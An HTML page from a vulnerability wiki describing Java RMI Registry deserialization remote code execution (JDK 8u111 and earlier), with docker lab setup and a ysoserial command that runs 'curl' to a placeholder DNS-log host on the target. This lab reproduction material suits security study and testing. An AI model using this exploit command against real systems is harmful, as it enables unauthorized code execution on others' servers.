<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/java/rmi-registry-bind-deserialization/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Java \u2264JDK 8u111 RMI Registry Deserialization Remote Code Execution", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Java ≤JDK 8u111 RMI Registry 反序列化命令执行
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../rmi-codebase/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../rmi-codebase/README.zh-cn/" class="btn btn-xs btn-link">
        Java RMI Codebase 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="java-jdk-8u111-rmi-registry-deserialization-remote-code-execution">Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution<a class="headerlink" href="#java-jdk-8u111-rmi-registry-deserialization-remote-code-execution" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data. This environment uses commons-collections:3.2.1 for demonstration.</p>
<p>References:</p>
<ul>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server">https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server</a></li>
<li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following commands to compile and start the RMI Registry and server:</p>
<div class="highlight"><pre><span></span><code>docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
</code></pre></div>
<p>Replace <code>your-ip</code> with your server's IP address. The client will use this IP to connect to the server.</p>
<p>After startup, the RMI Registry will be listening on port 1099.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:</p>
<div class="highlight"><pre><span></span><code>java<span class="w"> </span>-cp<span class="w"> </span>ysoserial-0.0.6-SNAPSHOT-all.jar<span class="w"> </span>ysoserial.exploit.RMIRegistryExploit<span class="w"> </span>your-ip<span class="w"> </span><span class="m">1099</span><span class="w"> </span>CommonsCollections6<span class="w"> </span><span class="s2">&quot;curl your-dnslog-server&quot;</span>
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>The Registry will return an error, but this is normal and the command will still execute successfully.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Java ≤JDK 8u111 RMI Registry 反序列化命令执行
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../rmi-codebase/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../rmi-codebase/README.zh-cn/" class="btn btn-xs btn-link">
        Java RMI Codebase 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>